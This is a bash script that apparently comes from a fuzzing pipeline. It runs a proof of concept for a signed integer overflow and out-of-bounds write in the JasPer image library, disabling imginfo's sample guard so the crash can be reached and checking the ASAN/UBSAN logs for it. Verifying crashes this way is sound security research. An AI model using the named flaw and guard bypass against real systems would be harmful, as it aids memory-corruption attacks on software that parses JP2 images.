#!/usr/bin/env bash
# vuln_001_run.sh - Run PoC for JasPer VULN 001 (signed integer overflow in numprcs)
# CWE-787: Out-of-bounds Write via jpc_t2cod.c:302-310, 403-412, 497-510

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
IMGINFO="/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo"
POC_JP2="${SCRIPT_DIR}/vuln_001.jp2"
ASAN_LOG_PREFIX="${SCRIPT_DIR}/asan.log"
RESULT_FILE="${SCRIPT_DIR}/result.txt"

echo "[*] Step 1: Generating PoC JP2 file..."
python3 "${SCRIPT_DIR}/vuln_001_gen.py"

echo "[*] Step 2: Running imginfo with ASAN+UBSAN options..."
# --max-samples 0 disables the 64M sample guard so we can reach the overflow site.
# The system needs ~17 GB RAM for the component buffer (46342*46341*8 bytes).
export ASAN_OPTIONS="log_path=${ASAN_LOG_PREFIX}:halt_on_error=0:detect_leaks=0"
export UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=${ASAN_LOG_PREFIX}"

set +e
"${IMGINFO}" --max-samples 0 -f "${POC_JP2}" 2>&1
EXIT_CODE=$?
set -e

echo "[*] imginfo exit code: ${EXIT_CODE}"

echo "[*] Step 3: Checking ASAN/UBSAN logs for errors..."
ASAN_FOUND=0
for log_file in "${ASAN_LOG_PREFIX}".*; do
    if [ -f "${log_file}" ]; then
        echo "[*] Found ASAN/UBSAN log: ${log_file}"
        cat "${log_file}"
        ASAN_FOUND=1
    fi
done

# Determine status
if [ "${ASAN_FOUND}" -eq 1 ] || [ "${EXIT_CODE}" -ne 0 ]; then
    STATUS="VERIFIED_CRASH"
else
    STATUS="UNVERIFIED"
fi

echo ""
echo "[*] Result: ${STATUS}"
echo "${STATUS}" > "${RESULT_FILE}"

# Append ASAN/UBSAN findings to result.txt
if [ "${ASAN_FOUND}" -eq 1 ]; then
    echo "--- ASAN/UBSAN output ---" >> "${RESULT_FILE}"
    for log_file in "${ASAN_LOG_PREFIX}".*; do
        [ -f "${log_file}" ] && grep -E "(ERROR|SUMMARY|overflow|assertion|runtime error)" \
            "${log_file}" >> "${RESULT_FILE}" 2>/dev/null || true
    done
fi

echo "[*] Result written to ${RESULT_FILE}"
